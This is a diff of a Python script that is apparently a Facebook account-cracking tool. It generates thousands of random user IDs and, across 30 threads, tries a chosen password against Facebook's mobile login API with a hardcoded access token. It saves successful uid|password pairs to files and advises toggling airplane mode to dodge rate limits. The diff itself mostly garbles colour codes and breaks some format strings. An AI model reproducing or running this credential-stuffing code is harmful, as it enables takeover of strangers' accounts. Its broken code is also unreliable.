@@ -1,10 +1,10 @@
-W = '\333[97;1m'
-R = '\333[91;1m'
-G = '\333[92;1m'
-Y = '\333[93;1m'
-B = '\333[94;1m'
-P = '\333[95;1m'
-C = '\333[96;1m'
+W = '\000[97;1m'
+R = '\000[91;1m'
+G = '\000[92;1m'
+Y = '\000[93;1m'
+B = '\000[94;1m'
+P = '\000[95;1m'
+C = '\000[96;1m'
 N = '\x1b[0m'
 import os
 try:
@@ -61,12 +61,12 @@ try:
 except:pass
 # COLORS
 x = '\33[m' 
-k = '\333[93m' 
+k = '\000[93m' 
 h = '\x1b[1;92m' 
-hh = '\333[32m' 
-u = '\333[95m' 
-K = '\333[95m' 
-kk = '\333[33m' 
+hh = '\000[32m' 
+u = '\000[95m' 
+K = '\000[95m' 
+kk = '\000[33m' 
 b = '\33[1;96m' 
 p = '\x1b[0;34m' 
 # Converter 
@@ -204,7 +204,7 @@ def setting():
 		print (' [!] Choose Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \333[1;97m')
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \000[1;97m')
 	hc = input ("\n [#] method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -228,7 +228,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( ' [!] \333[1;96mTurn Airplane Mode On/Off Every 5 Minutes\333[1;0m\n')
+	print(logo);print( ' [!] \000[1;96mTurn Airplane Mode On/Off Every 5 Minutes\000[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -255,7 +255,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \333[1;92mOK/%s\333[1;97m\n [] CP Result Saved To : \333[1;91mCP/%s\333[1;97m\n [!] \333[1;96mTurn Airplane Mode On/Off Every 5 Minutes\333[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Result Saved To : \000[1;92mOK/%s\000[1;97m\n [] CP Result Saved To : \000[1;91mCP/%s\000[1;97m\n [!] \000[1;96mTurn Airplane Mode On/Off Every 5 Minutes\000[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -275,7 +275,7 @@ def name():
 				pass
 def name2():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \333[1;92mOK/%s\333[1;97m\n [] CP Result Saved To : \333[1;91mCP/%s\333[1;97m\n [!] \333[1;96mTurn Airplane Mode On/Off Every 5 Minutes\333[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Result Saved To : \000[1;92mOK/%s\000[1;97m\n [] CP Result Saved To : \000[1;91mCP/%s\000[1;97m\n [!] \000[1;96mTurn Airplane Mode On/Off Every 5 Minutes\000[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -448,7 +448,7 @@ class Main:
 			print("\000[+] TOTAL ID ->\000"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\000[!] USE (123456) FOR IDZ\000")
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input(" [?] ENTER PASSWORD : "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> \000"%(G,listpass))
@@ -846,7 +846,7 @@ class Main:
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \000[ OHAN-OK ] %s | %s\000    "%(uid, pw))
-				print ("\r \333[0;92m Congrats Bro ")
+				print ("\r \000[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
@@ -865,20 +865,20 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \333[+]\333TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\n \000[+]\000TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\333[[+] TOTAL ID -> \333%s\333"%(len(self.id))) 
+			print("\000[[+] TOTAL ID -> \000%s\000"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\333[!] USE (123456) FOR IDZ\333")
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				print("\n\000[!] USE (123456) FOR IDZ\000")
+				listpass = input(" [?] ENTER PASSWORD : "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\333%s\333"%(G,listpass))
+				print("%s [*] CRACK WITH PASSWORD -> [\000%s\000"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
@@ -1272,13 +1272,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \333[ OHAN-OK ] %s | %s\333        "%(uid, pw))
-				print ("\r \333[ Congrats Bro ")
+				print("\r \000[ OHAN-OK ] %s | %s\000        "%(uid, pw))
+				print ("\r \000[ Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-OHAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \333 OHAN-OK ] %s | %s\333 "%(uid, pw))
+				print("\r \000 OHAN-OK ] %s | %s\000 "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-OHAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -1300,13 +1300,13 @@ def Subscraption():
 	else:
 		os.system("clear")
 		print(logo)
-		print("\t \333[1;32m First Get Approvel\333[1;37m ")
+		print("\t \000[1;32m First Get Approvel\000[1;37m ")
 		time.sleep(1)
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \333[1;32m OHAN  Toll Paid You Need Get Approved First\333[1;37m\n")
-		print(" \333[1;32m Note : Paid Tolls Free  HA JANI LOG \333[1;37m")
+		print(" \000[1;32m OHAN  Toll Paid You Need Get Approved First\000[1;37m\n")
+		print(" \000[1;32m Note : Paid Tolls Free  HA JANI LOG \000[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
